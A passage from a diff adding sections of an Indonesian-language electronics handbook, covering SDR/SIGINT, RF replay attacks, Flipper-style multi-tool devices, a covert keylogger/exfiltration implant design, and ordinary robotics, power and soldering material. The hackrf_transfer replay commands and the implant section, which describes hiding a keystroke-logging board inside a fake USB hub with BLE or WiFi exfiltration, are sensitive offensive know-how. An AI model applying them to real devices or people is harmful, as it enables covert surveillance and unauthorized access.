+<span class="cm">Fitur: scan → pilih target → deauth/beacon/probe attack</span></code></pre>
+
+  <h3>WiFi Adapter untuk Monitor Mode & Injection</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Adapter</th><th>Chipset</th><th>Monitor</th><th>Inject</th><th>Band</th></tr></thead>
+    <tbody>
+      <tr><td>Alfa AWUS036ACH</td><td>RTL8812AU</td><td>✓</td><td>✓</td><td>2.4 + 5 GHz</td></tr>
+      <tr><td>TP-Link WN722N v1</td><td>AR9271</td><td>✓</td><td>✓</td><td>2.4 GHz saja</td></tr>
+      <tr><td>Alfa AWUS036NHA</td><td>AR9271</td><td>✓</td><td>✓</td><td>2.4 GHz saja</td></tr>
+      <tr><td>Alfa AWUS1900</td><td>RTL8814AU</td><td>✓</td><td>✓</td><td>Dual band, 4 antena</td></tr>
+    </tbody>
+  </table></div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     20. SDR & SIGINT
+═════════════════════════════════════════════ -->
+<div class="section" id="sdr-sigint">
+  <div class="section-label">§ 20 — SDR & SIGINT</div>
+  <h2 class="section-title">SDR & SIGINT Collection</h2>
+
+  <h3>Setup SIGINT dengan RTL-SDR + GNU Radio / SDR#</h3>
+  <pre><code><span class="cm"># Install GNU Radio + RTL-SDR drivers (Linux)</span>
+<span class="kw">sudo</span> apt install gnuradio rtl-sdr gr-osmosdr
+
+<span class="cm"># Test RTL-SDR</span>
+<span class="kw">rtl_test</span> -t
+
+<span class="cm"># Capture raw IQ sample ke file</span>
+<span class="kw">rtl_sdr</span> -f <span class="num">433920000</span> -s <span class="num">2000000</span> -g <span class="num">40</span> capture.iq
+
+<span class="cm"># Decode berbagai protokol dengan multimode:</span>
+<span class="kw">rtl_433</span> -f <span class="num">433920000</span>   <span class="cm"># Auto-decode ISM 433MHz devices</span>
+<span class="kw">dump1090</span> --interactive  <span class="cm"># ADS-B (aircraft tracking)</span>
+<span class="kw">rtl_fm</span> -f <span class="num">100.1e6</span> -M wbfm -r <span class="num">44100</span> | aplay -r <span class="num">44100</span> -f S16_LE  <span class="cm"># FM radio</span></code></pre>
+
+  <h3>Target Sinyal untuk SIGINT Research</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Target</th><th>Frekuensi</th><th>Modulasi</th><th>Tool Decode</th></tr></thead>
+    <tbody>
+      <tr><td>FM Radio</td><td>88–108 MHz</td><td>WBFM</td><td>rtl_fm, GQRX</td></tr>
+      <tr><td>ADS-B (Pesawat)</td><td>1090 MHz</td><td>PPM</td><td>dump1090, tar1090</td></tr>
+      <tr><td>AIS (Kapal)</td><td>161.975/162.025 MHz</td><td>GMSK</td><td>rtl-ais</td></tr>
+      <tr><td>ACARS (Pesawat)</td><td>129.125 MHz</td><td>AM + ACARS</td><td>acarsdec</td></tr>
+      <tr><td>Trunked Radio</td><td>Varies (DMR/P25/NXDN)</td><td>Digital</td><td>DSD+, OP25</td></tr>
+      <tr><td>Remote 433MHz</td><td>433.92 MHz</td><td>OOK/ASK</td><td>rtl_433, URH</td></tr>
+      <tr><td>Weather Sonde</td><td>400–406 MHz</td><td>FSK</td><td>RS</td></tr>
+      <tr><td>NOAA Weather Sat</td><td>137.1–137.9 MHz</td><td>APT/LRPT</td><td>WXtoImg, SATDUMP</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Replay Attack — Remote Controls</h3>
+  <pre><code><span class="cm">/* Capture dan replay sinyal remote 433MHz */</span>
+
+<span class="cm"># Dengan HackRF One:</span>
+<span class="cm"># Capture</span>
+<span class="kw">hackrf_transfer</span> -r capture.raw -f <span class="num">433920000</span> -s <span class="num">8000000</span> -l <span class="num">40</span> -g <span class="num">62</span>
+
+<span class="cm"># Replay (transmit)</span>
+<span class="kw">hackrf_transfer</span> -t capture.raw -f <span class="num">433920000</span> -s <span class="num">8000000</span> -x <span class="num">47</span>
+
+<span class="cm"># Analisis dengan Universal Radio Hacker (URH)</span>
+<span class="cm"># GUI tool untuk capture, analyze, decode, fuzzing protokol RF</span>
+<span class="kw">pip3</span> install urh
+<span class="kw">urh</span>  <span class="cm"># Launch GUI</span></code></pre>
+</div>
+
+<!-- ════════════════════════════════════════════
+     21. FLIPPER-CLASS DEVICES
+═════════════════════════════════════════════ -->
+<div class="section" id="flipper">
+  <div class="section-label">§ 21 — Multi-Tool Devices</div>
+  <h2 class="section-title">Flipper-Class Multi-Attack Devices</h2>
+
+  <h3>Flipper Zero — Arsitektur Hardware</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Komponen</th><th>Part</th><th>Fungsi</th></tr></thead>
+    <tbody>
+      <tr><td>MCU Utama</td><td>STM32WB55</td><td>ARM Cortex-M4 + M0 coprocessor</td></tr>
+      <tr><td>Sub-GHz Radio</td><td>CC1101</td><td>300–928 MHz, ASK/OOK/FSK/GFSK/MSK</td></tr>
+      <tr><td>NFC</td><td>ST25R3916</td><td>13.56 MHz, ISO14443A/B, ISO15693, FeliCa</td></tr>
+      <tr><td>RFID 125kHz</td><td>Dedicated circuit</td><td>EM4100, HID, Indala clone/emulate</td></tr>
+      <tr><td>Bluetooth</td><td>STM32WB55 internal</td><td>BLE 5.0</td></tr>
+      <tr><td>IR Transceiver</td><td>SFH4545 + TSOP75338</td><td>TX/RX infrared, TV/AC remote</td></tr>
+      <tr><td>iButton</td><td>1-Wire</td><td>Dallas key clone/emulate</td></tr>
+      <tr><td>GPIO</td><td>—</td><td>I2C, SPI, UART, 3.3V/5V</td></tr>
+      <tr><td>Display</td><td>128×64 monochrome LCD</td><td>—</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Build Clone Flipper — Budget Alternative</h3>
+  <p>Komponen untuk build multi-tool device sendiri:</p>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Komponen</th><th>Part</th><th>Harga</th><th>Fungsi</th></tr></thead>
+    <tbody>
+      <tr><td>MCU</td><td>STM32WB55 atau ESP32-S3</td><td>$5–15</td><td>Core controller</td></tr>
+      <tr><td>Sub-GHz</td><td>CC1101 module</td><td>$2–5</td><td>315/433/868/915 MHz</td></tr>
+      <tr><td>NFC</td><td>PN532 module</td><td>$5–8</td><td>13.56 MHz RFID/NFC</td></tr>
+      <tr><td>RFID 125k</td><td>EM4100 reader coil + circuit</td><td>$3</td><td>LF RFID</td></tr>
+      <tr><td>IR TX/RX</td><td>TSOP38238 + IR LED</td><td>$1</td><td>Infrared</td></tr>
+      <tr><td>Display</td><td>SSD1306 128×64 OLED</td><td>$2</td><td>Display</td></tr>
+      <tr><td>Battery</td><td>LiPo 1000mAh + TP4056</td><td>$3</td><td>Power</td></tr>
+      <tr><td>USB HID</td><td>Native USB di MCU</td><td>—</td><td>BadUSB capability</td></tr>
+    </tbody>
+  </table></div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     22. IMPLANT & COVERT HARDWARE
+═════════════════════════════════════════════ -->
+<div class="section" id="implant">
+  <div class="section-label">§ 22 — Covert Hardware</div>
+  <h2 class="section-title">Implant & Covert Hardware Design</h2>
+
+  <h3>Desain Implant Hardware — Prinsip</h3>
+  <p>Perangkat implant dirancang untuk miniaturisasi, daya rendah, dan deteksi minimal:</p>
+  <ul>
+    <li><strong>Ukuran minimal:</strong> Target PCB &lt;20×20mm. Gunakan komponenBGA dan 0201/0402.</li>
+    <li><strong>Daya rendah:</strong> Sleep mode sebagian besar waktu. Wake on RF/trigger.</li>
+    <li><strong>RF covert:</strong> Transmit burst singkat. Frequency hop. Spread spectrum.</li>
+    <li><strong>Power harvesting:</strong> RF energy harvest (915MHz), USB VBUS, atau sel surya kecil.</li>
+    <li><strong>Tamper resistance:</strong> Epoxy encapsulation, mesh tamper detection.</li>
+  </ul>
+
+  <h3>Contoh Implant Platform Minimal</h3>
+  <pre><code><span class="label">MINIMAL KEYLOGGER/EXFIL IMPLANT:</span>
+
+<span class="var">MCU</span>     : nRF52840 (ARM CM4, BLE 5.0, Ultra-low power)
+<span class="var">Storage</span> : W25Q32 SPI Flash (4MB keylog buffer)
+<span class="var">Radio</span>   : Onboard BLE (native) + optional CC1101 SPI
+<span class="var">Power</span>   : USB VBUS 5V → AMS1117-3.3 LDO → nRF
+<span class="var">PCB</span>     : 4-layer, 18×22mm
+
+<span class="cm">/* Operasi: */</span>
+<span class="cm">- Masuk antara keyboard USB dan host</span>
+<span class="cm">- Log setiap keystroke ke SPI flash</span>
+<span class="cm">- Expose BLE endpoint untuk dump via app</span>
+<span class="cm">- Atau: inject ke WiFi AP terdekat via nRF Wifi (nRF7002)</span>
+
+<span class="cm">/* Form factor: PCB terenkapulasi epoxy dalam enclosure mirip USB hub */</span></code></pre>
+
+  <div class="callout danger">
+    <div class="callout-title">⚠ Legal Notice</div>
+    Pembuatan dan penggunaan implant hardware tanpa otorisasi merupakan tindakan ilegal di sebagian besar yurisdiksi. Informasi ini untuk keperluan authorized penetration testing, penelitian keamanan, dan pembuatan capability untuk institusi yang memiliki kewenangan hukum.
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     23. MOTOR & AKTUATOR
+═════════════════════════════════════════════ -->
+<div class="section" id="motor">
+  <div class="section-label">§ 23 — Robotika</div>
+  <h2 class="section-title">Motor & Aktuator untuk Robotika</h2>
+
+  <h3>Jenis Motor</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Jenis</th><th>Kontrol</th><th>Keunggulan</th><th>Kelemahan</th><th>Aplikasi</th></tr></thead>
+    <tbody>
+      <tr><td><strong>DC Brushed</strong></td><td>Tegangan/PWM + H-Bridge</td><td>Murah, sederhana, torsi tinggi</td><td>Brush aus, noise EMI</td><td>Robot sederhana, fan</td></tr>
+      <tr><td><strong>DC Brushless (BLDC)</strong></td><td>ESC atau FOC controller</td><td>Efisien, awet, rpm tinggi</td><td>Driver kompleks, mahal</td><td>Drone, mobil listrik, gimbal</td></tr>
+      <tr><td><strong>Stepper</strong></td><td>Step + direction pulse</td><td>Presisi posisi tanpa encoder</td><td>Vibration, lose step jika overload</td><td>CNC, 3D printer, actuator presisi</td></tr>
+      <tr><td><strong>Servo RC</strong></td><td>PWM 50Hz, 1–2ms pulse</td><td>Mudah, posisi terkontrol</td><td>Range terbatas (180°)</td><td>Robot arm, steering</td></tr>
+      <tr><td><strong>Linear Actuator</strong></td><td>DC motor + gearbox</td><td>Force besar, linear motion</td><td>Lambat</td><td>Door, press mechanism</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>H-Bridge — Driver Motor DC</h3>
+  <p>Sirkuit 4 switch yang memungkinkan motor berputar dua arah:</p>
+  <pre><code><span class="cm">/* Konfigurasi H-Bridge */</span>
+<span class="cm">        VCC</span>
+<span class="cm">    SW1 │ SW2</span>
+<span class="cm">    ────┼────</span>
+<span class="cm">  SW3 │ │ │ SW4</span>
+<span class="cm">    ──┴─┴─┴──</span>
+<span class="cm">       GND</span>
+
+<span class="cm">Forward : SW1+SW4 ON, SW2+SW3 OFF</span>
+<span class="cm">Reverse : SW2+SW3 ON, SW1+SW4 OFF</span>
+<span class="cm">Brake   : SW1+SW2 ON atau SW3+SW4 ON</span>
+<span class="cm">Coast   : Semua OFF</span>
+
+<span class="cm">/* IC H-Bridge populer: */</span>
+<span class="cm">- L293D    : 600mA/ch, 4.5–36V, internal dioda, 2 motor</span>
+<span class="cm">- L298N    : 2A/ch, 5–46V, populer untuk medium robot</span>
+<span class="cm">- DRV8833  : 1.5A/ch, 2.7–10.8V, compact, low quiescent</span>
+<span class="cm">- TB6612FNG: 1.2A/ch, 2.7–13.5V, efisien, compact</span>
+<span class="cm">- BTS7960  : 43A, untuk motor besar (kendaraan)</span></code></pre>
+
+  <h3>Stepper Motor Driver</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Driver IC</th><th>Arus Max</th><th>Microstepping</th><th>Interface</th></tr></thead>
+    <tbody>
+      <tr><td><strong>A4988</strong></td><td>2A</td><td>1/1, 1/2, 1/4, 1/8, 1/16</td><td>STEP/DIR</td></tr>
+      <tr><td><strong>DRV8825</strong></td><td>2.5A</td><td>Hingga 1/32</td><td>STEP/DIR</td></tr>
+      <tr><td><strong>TMC2209</strong></td><td>2A (2.8A peak)</td><td>Hingga 1/256, StealthChop</td><td>STEP/DIR + UART</td></tr>
+      <tr><td><strong>TMC5160</strong></td><td>3A</td><td>Hingga 1/256, SPI config</td><td>STEP/DIR + SPI</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Servo Control</h3>
+  <pre><code><span class="cm">/* Standard RC Servo: PWM 50Hz (20ms period) */</span>
+<span class="cm">/* Pulse width menentukan posisi: */</span>
+<span class="cm">/* 1ms (0°) ... 1.5ms (90°) ... 2ms (180°) */</span>
+
+<span class="cm">// Arduino servo example</span>
+<span class="kw">#include</span> &lt;Servo.h&gt;
+<span class="var">Servo</span> myServo;
+myServo.<span class="fn">attach</span>(<span class="num">9</span>);   <span class="cm">// GPIO9</span>
+myServo.<span class="fn">write</span>(<span class="num">90</span>);  <span class="cm">// 90 derajat</span>
+
+<span class="cm">// STM32 HAL — PWM direct:</span>
+<span class="cm">// TIM period = 20ms, pulse width = 1000–2000 us</span>
+<span class="var">TIM2->CCR1</span> = <span class="num">1500</span>;  <span class="cm">// 1.5ms = 90 degrees</span></code></pre>
+</div>
+
+<!-- ════════════════════════════════════════════
+     24. SENSOR & PERSEPSI
+═════════════════════════════════════════════ -->
+<div class="section" id="sensor">
+  <div class="section-label">§ 24 — Sensor</div>
+  <h2 class="section-title">Sensor & Persepsi Robot</h2>
+
+  <h3>Kategori Sensor</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Kategori</th><th>Sensor</th><th>Interface</th><th>Part Contoh</th></tr></thead>
+    <tbody>
+      <tr><td>Jarak</td><td>Ultrasonik</td><td>Trig/Echo GPIO</td><td>HC-SR04 (2cm–400cm)</td></tr>
+      <tr><td>Jarak</td><td>IR ToF</td><td>I2C</td><td>VL53L0X, VL53L1X</td></tr>
+      <tr><td>Jarak</td><td>LiDAR</td><td>UART/SPI</td><td>TFmini, RPLiDAR A1</td></tr>
+      <tr><td>IMU</td><td>Accelerometer + Gyro</td><td>I2C/SPI</td><td>MPU6050, ICM-42688, LSM6DSO</td></tr>
+      <tr><td>IMU</td><td>9-DOF + Magnetometer</td><td>I2C</td><td>ICM-20948, BNO055</td></tr>
+      <tr><td>Encoder</td><td>Incremental quadrature</td><td>GPIO interrupt</td><td>LPD3806, AS5600 (magnetic)</td></tr>
+      <tr><td>Suhu/Humidity</td><td>Digital</td><td>1-Wire/I2C</td><td>DS18B20, DHT22, BME280</td></tr>
+      <tr><td>Tekanan</td><td>Barometer</td><td>I2C</td><td>BMP280, MS5611</td></tr>
+      <tr><td>Kamera</td><td>RGB/Grayscale</td><td>MIPI CSI/SPI</td><td>OV7670, ArduCam</td></tr>
+      <tr><td>GPS</td><td>GNSS</td><td>UART (NMEA)</td><td>u-blox NEO-M8N, BN-880</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>MPU6050 — IMU I2C</h3>
+  <pre><code><span class="cm">/* MPU6050: 3-axis accel + 3-axis gyro, DMP onboard */</span>
+<span class="cm">/* I2C address: 0x68 (AD0=LOW) atau 0x69 (AD0=HIGH) */</span>
+
+<span class="cm">/* Register penting: */</span>
+<span class="var">PWR_MGMT_1</span>   = <span class="num">0x6B</span>  <span class="cm">// Wake up: write 0x00</span>
+<span class="var">ACCEL_XOUT_H</span> = <span class="num">0x3B</span>  <span class="cm">// 6 bytes: AX, AY, AZ (big-endian 16-bit)</span>
+<span class="var">GYRO_XOUT_H</span>  = <span class="num">0x43</span>  <span class="cm">// 6 bytes: GX, GY, GZ</span>
+<span class="var">TEMP_OUT_H</span>   = <span class="num">0x41</span>  <span class="cm">// Temperature</span>
+
+<span class="cm">/* Full-scale range */</span>
+<span class="cm">Accel: ±2g / ±4g / ±8g / ±16g (default ±2g, LSB = 16384/g)</span>
+<span class="cm">Gyro:  ±250 / ±500 / ±1000 / ±2000 dps (default ±250, LSB = 131/(°/s))</span>
+
+<span class="cm">/* Konversi: */</span>
+<span class="var">accel_x_ms2</span> = raw_x / <span class="num">16384.0</span> × <span class="num">9.81</span>
+<span class="var">gyro_x_dps</span>  = raw_x / <span class="num">131.0</span></code></pre>
+</div>
+
+<!-- ════════════════════════════════════════════
+     25. KONTROL & PID
+═════════════════════════════════════════════ -->
+<div class="section" id="control">
+  <div class="section-label">§ 25 — Kontrol</div>
+  <h2 class="section-title">Sistem Kontrol & PID</h2>
+
+  <h3>Kontrol Loop Dasar</h3>
+  <pre><code><span class="cm">/* Closed-loop control system */</span>
+<span class="cm">Setpoint → [Controller] → [Plant/Actuator] → Output</span>
+<span class="cm">                              ↑                   │</span>
+<span class="cm">                         [Feedback] ←──────────────┘</span>
+<span class="cm">                          (Sensor)</span></code></pre>
+
+  <h3>PID Controller</h3>
+  <p>Proportional–Integral–Derivative — controller paling umum digunakan dalam robotika dan industri.</p>
+  <div class="formula">u(t) = Kp×e(t) + Ki×∫e(t)dt + Kd×(de/dt)</div>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Term</th><th>Formula</th><th>Efek</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Proportional (P)</strong></td><td>Kp × e(t)</td><td>Output proporsional error. Kurangi rise time, tapi ada steady-state error.</td></tr>
+      <tr><td><strong>Integral (I)</strong></td><td>Ki × ∫e dt</td><td>Eliminasi steady-state error. Bisa menyebabkan overshoot dan wind-up.</td></tr>
+      <tr><td><strong>Derivative (D)</strong></td><td>Kd × de/dt</td><td>Prediksi error, kurangi overshoot, tapi amplifikasi noise.</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Implementasi PID Digital</h3>
+  <pre><code><span class="kw">typedef struct</span> {
+  <span class="kw">float</span> <span class="var">Kp</span>, <span class="var">Ki</span>, <span class="var">Kd</span>;
+  <span class="kw">float</span> <span class="var">integral</span>, <span class="var">prev_error</span>;
+  <span class="kw">float</span> <span class="var">output_min</span>, <span class="var">output_max</span>;
+  <span class="kw">float</span> <span class="var">dt</span>;  <span class="cm">// sampling time (seconds)</span>
+} PID_t;
+
+<span class="kw">float</span> <span class="fn">PID_update</span>(PID_t *pid, <span class="kw">float</span> <span class="var">setpoint</span>, <span class="kw">float</span> <span class="var">measurement</span>) {
+  <span class="kw">float</span> <span class="var">error</span>      = setpoint - measurement;
+  pid->integral   += error × pid->dt;
+  
+  <span class="cm">/* Anti-windup clamp */</span>
+  <span class="kw">if</span> (pid->integral > pid->output_max / pid->Ki)
+    pid->integral = pid->output_max / pid->Ki;
+  
+  <span class="kw">float</span> <span class="var">derivative</span> = (error - pid->prev_error) / pid->dt;
+  pid->prev_error  = error;
+  
+  <span class="kw">float</span> <span class="var">output</span> = pid->Kp * error + pid->Ki * pid->integral + pid->Kd * derivative;
+  
+  <span class="cm">/* Clamp output */</span>
+  <span class="kw">if</span> (output > pid->output_max) output = pid->output_max;
+  <span class="kw">if</span> (output < pid->output_min) output = pid->output_min;
+  
+  <span class="kw">return</span> output;
+}</code></pre>
+
+  <h3>Tuning PID — Metode Ziegler-Nichols</h3>
+  <pre><code><span class="label">METODE ZIEGLER-NICHOLS:</span>
+<span class="num">1.</span> Set Ki=0, Kd=0
+<span class="num">2.</span> Naikkan Kp pelan-pelan sampai output berosilasi stabil
+<span class="num">3.</span> Catat: Ku (ultimate gain) dan Tu (period osilasi)
+<span class="num">4.</span> Set nilai PID berdasarkan tabel:
+
+<span class="var">P only</span>  : Kp=0.5×Ku
+<span class="var">PI</span>      : Kp=0.45×Ku, Ki=0.54×Ku/Tu
+<span class="var">PID</span>     : Kp=0.6×Ku,  Ki=1.2×Ku/Tu, Kd=3×Ku×Tu/40
+
+<span class="cm">/* Untuk robotika modern: gunakan Auto-tuning library */</span>
+<span class="cm">/* atau trial-error: P → PI → PID */</span></code></pre>
+</div>
+
+<!-- ════════════════════════════════════════════
+     26. POWER SUPPLY & BATERAI
+═════════════════════════════════════════════ -->
+<div class="section" id="power">
+  <div class="section-label">§ 26 — Power</div>
+  <h2 class="section-title">Power Supply & Manajemen Baterai</h2>
+
+  <h3>Baterai LiPo / Li-Ion</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Parameter</th><th>Nilai</th><th>Catatan</th></tr></thead>
+    <tbody>
+      <tr><td>Voltage nominal</td><td>3.7V per cell</td><td>—</td></tr>
+      <tr><td>Voltage fully charged</td><td>4.2V per cell</td><td>Jangan melebihi ini</td></tr>
+      <tr><td>Voltage cut-off</td><td>3.0V per cell</td><td>Di bawah = kerusakan permanen</td></tr>
+      <tr><td>C rating</td><td>1C = full charge/discharge dalam 1 jam</td><td>Drone LiPo: 25C–100C discharge</td></tr>
+      <tr><td>Charging current</td><td>0.5C–1C aman</td><td>Max 2C untuk LiPo fast charge</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Charging IC — TP4056</h3>
+  <p>IC charger LiPo populer untuk proyek DIY. Tegangan input 4–8V, output charge current max 1A (configurable via R_prog).</p>
+  <div class="formula">I_charge (mA) = 1000 / R_prog (kΩ)</div>
+  <p>Contoh: R_prog = 1.2kΩ → I_charge = 833mA. LED merah = charging, LED biru = selesai.</p>
+
+  <h3>Fuel Gauge — MAX17048</h3>
+  <pre><code><span class="cm">/* IC fuel gauge I2C untuk estimasi SOC (State of Charge) */</span>
+<span class="cm">/* I2C address: 0x36 */</span>
+<span class="cm">/* Register VCELL (0x02): voltase baterai, 78.125 µV per LSB */</span>
+<span class="cm">/* Register SOC (0x04): % charge, 1/256% per LSB */</span>
+
+<span class="kw">uint16_t</span> <span class="var">vcell_raw</span> = <span class="fn">i2c_read16</span>(<span class="num">0x36</span>, <span class="num">0x02</span>);
+<span class="kw">float</span> <span class="var">voltage</span> = (vcell_raw >> <span class="num">4</span>) × <span class="num">0.00125</span>;  <span class="cm">// Volts</span>
+<span class="kw">uint16_t</span> <span class="var">soc_raw</span> = <span class="fn">i2c_read16</span>(<span class="num">0x36</span>, <span class="num">0x04</span>);
+<span class="kw">float</span> <span class="var">soc_pct</span> = soc_raw / <span class="num">256.0</span>;  <span class="cm">// Percent 0–100</span></code></pre>
+
+  <h3>Buck Converter — Hitung Nilai Komponen</h3>
+  <pre><code><span class="cm">/* Buck converter: Vin=12V, Vout=5V, Iout=2A, fsw=400kHz */</span>
+
+<span class="cm">/* Duty cycle: */</span>
+<span class="cm">D = Vout / Vin = 5/12 = 0.417 = 41.7%</span>
+
+<span class="cm">/* Minimum induktansi (ripple current 20% Iout): */</span>
+<span class="cm">ΔIL = 0.2 × 2A = 0.4A</span>
+<span class="cm">L = (Vin - Vout) × D / (fsw × ΔIL)</span>
+<span class="cm">L = (12-5) × 0.417 / (400000 × 0.4) = 18.2µH → pilih 22µH</span>
+
+<span class="cm">/* Kapasitor output (ripple voltage 50mV): */</span>
+<span class="cm">ΔV = ΔIL / (8 × fsw × Cout)</span>
+<span class="cm">Cout = ΔIL / (8 × fsw × ΔV)</span>
+<span class="cm">Cout = 0.4 / (8 × 400000 × 0.05) = 2.5µF → pilih 10µF (margin)</span></code></pre>
+</div>
+
+<!-- ════════════════════════════════════════════
+     27. PERALATAN LAB
+═════════════════════════════════════════════ -->
+<div class="section" id="tools">
+  <div class="section-label">§ 27 — Lab Tools</div>
+  <h2 class="section-title">Peralatan Lab Elektronika</h2>
+
+  <h3>Oscilloscope</h3>
+  <p>Instrumen paling penting untuk debug elektronika — menampilkan sinyal vs waktu.</p>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Spek</th><th>Entry Level</th><th>Recommended</th><th>Professional</th></tr></thead>
+    <tbody>
+      <tr><td>Bandwidth</td><td>50 MHz</td><td>100–200 MHz</td><td>500 MHz+</td></tr>
+      <tr><td>Sample Rate</td><td>1 GSa/s</td><td>1–2 GSa/s</td><td>5 GSa/s+</td></tr>
+      <tr><td>Channels</td><td>2</td><td>2–4</td><td>4+</td></tr>
+      <tr><td>Contoh</td><td>DS1054Z ($300)</td><td>MSO5074 ($800)</td><td>MSO6 series</td></tr>
+      <tr><td>Budget DIY</td><td>Hantek 6022BE ($50)</td><td>—</td><td>—</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Logic Analyzer</h3>
+  <p>Capture dan decode digital signals — UART, SPI, I2C, CAN, I2S, dll.</p>
+  <ul>
+    <li><strong>Saleae Logic 8:</strong> 8 channel, 100MHz, software decode sangat lengkap (~$500)</li>
+    <li><strong>FX2LAFW clone:</strong> Saleae clone, 8 channel, $10–20, kompatibel Sigrok/PulseView</li>
+    <li><strong>DreamSourceLab DSLogic:</strong> 16 channel, 400MHz, $100</li>
+    <li><strong>Oscilloscope MSO:</strong> Mixed signal oscilloscope = scope + logic analyzer</li>
+  </ul>
+
+  <h3>Multimeter</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Fungsi</th><th>Cara Pakai</th><th>Catatan</th></tr></thead>
+    <tbody>
+      <tr><td>DC Voltage</td><td>Probe merah ke +, hitam ke GND</td><td>Pilih range sedikit di atas perkiraan V</td></tr>
+      <tr><td>Continuity</td><td>Mode buzzer — beep = koneksi ada</td><td>Ideal untuk trace PCB, short detection</td></tr>
+      <tr><td>Resistansi</td><td>Komponen off, probe paralel</td><td>Komponen on-board bisa kasih bacaan salah</td></tr>
+      <tr><td>Diode</td><td>Probe merah ke anode</td><td>Tampilkan Vf — identifikasi dioda, LED</td></tr>
+      <tr><td>AC Voltage</td><td>Mode VAC</td><td>Jangan gunakan untuk sinyal frekuensi tinggi</td></tr>
+      <tr><td>DC Current</td><td>Seri di rangkaian, range A/mA</td><td>Meter rusak jika salah pasang — hati-hati!</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Bench Power Supply</h3>
+  <p>Wajib punya adjustable DC supply untuk pengembangan:</p>
+  <ul>
+    <li><strong>Spek minimal:</strong> 0–30V, 0–5A, CV/CC mode, display voltase+arus</li>
+    <li><strong>Recommended:</strong> Rigol DP832 (triple output, 30V/3A, 5V/3A, programmable)</li>
+    <li><strong>Budget:</strong> Korad KA3005P atau clone bench supply dari AliExpress</li>
+    <li><strong>Protip:</strong> Current limit ke arus minimal saat pertama menghidupkan PCB baru — proteksi dari short circuit</li>
+  </ul>
+
+  <h3>Software Analisis</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Tool</th><th>Fungsi</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Sigrok / PulseView</strong></td><td>Open-source logic analyzer frontend, decode banyak protokol</td></tr>
+      <tr><td><strong>GNU Radio</strong></td><td>SDR flowgraph — capture, process, decode RF signal</td></tr>
+      <tr><td><strong>Audacity</strong></td><td>Analisis sinyal audio, visualize AM/FM demodulasi</td></tr>
+      <tr><td><strong>Ghidra / IDA</strong></td><td>Reverse engineering firmware yang di-dump dari flash</td></tr>
+      <tr><td><strong>binwalk</strong></td><td>Firmware analysis, extract filesystem, entropy analysis</td></tr>
+      <tr><td><strong>Wireshark</strong></td><td>Capture + decode network — termasuk USB packet capture</td></tr>
+      <tr><td><strong>OpenOCD</strong></td><td>JTAG/SWD debugging, flash programming</td></tr>
+      <tr><td><strong>QEMU</strong></td><td>Emulasi firmware ARM/MIPS untuk analisis tanpa hardware</td></tr>
+    </tbody>
+  </table></div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     28. SOLDERING & REWORK
+═════════════════════════════════════════════ -->
+<div class="section" id="soldering">
+  <div class="section-label">§ 28 — Soldering</div>
+  <h2 class="section-title">Soldering & Rework SMD</h2>
+
+  <h3>Pilihan Solder</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Jenis</th><th>Komposisi</th><th>Melting Point</th><th>Cocok untuk</th></tr></thead>
+    <tbody>
+      <tr><td>Leaded 60/40</td><td>Sn60/Pb40</td><td>183°C</td><td>Mudah, glossy, flow bagus</td></tr>
+      <tr><td>Leaded 63/37</td><td>Sn63/Pb37</td><td>183°C (eutectic)</td><td>Kualitas terbaik, single melting point</td></tr>
+      <tr><td>Lead-free SAC305</td><td>Sn96.5/Ag3/Cu0.5</td><td>217–221°C</td><td>RoHS, sedikit lebih keras soldernya</td></tr>
+      <tr><td>Bismuth low-temp</td><td>Sn42/Bi58</td><td>138°C</td><td>Rework komponen heat-sensitive</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Suhu Soldering Iron</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Task</th><th>Suhu (Leaded)</th><th>Suhu (Lead-free)</th></tr></thead>
+    <tbody>
+      <tr><td>THT komponen umum</td><td>310–330°C</td><td>360–380°C</td></tr>
+      <tr><td>SMD 0402–0805</td><td>300–320°C</td><td>340–360°C</td></tr>
+      <tr><td>QFP/TQFP (fine pitch)</td><td>300–320°C</td><td>340–360°C</td></tr>
+      <tr><td>Ground plane/heatsink</td><td>350–370°C</td><td>390–410°C</td></tr>
+      <tr><td>Kabel stranded</td><td>320–350°C</td><td>360–390°C</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Teknik Solder SMD Manual</h3>
+  <pre><code><span class="label">SMD DRAG SOLDER (untuk QFP/TQFP):</span>
+<span class="num">1.</span> Flux lebih pada semua pin
+<span class="num">2.</span> Tin (tinning) tip iron dengan sedikit solder
+<span class="num">3.</span> Fix komponen: solder 2 pin sudut berlawanan
+<span class="num">4.</span> Apply flux lebih ke semua pin
+<span class="num">5.</span> Drag iron perlahan di sepanjang baris pin (30–45°)
+<span class="num">6.</span> Bridge akan terbentuk → hapus dengan wick/braid
+<span class="num">7.</span> Clean flux residue dengan IPA + brush
+
+<span class="label">REFLOW HOT AIR (untuk QFN/BGA):</span>
+<span class="num">1.</span> Apply solder paste ke pad (syringe atau stencil)
+<span class="num">2.</span> Tempatkan komponen dengan tweezer + alignment
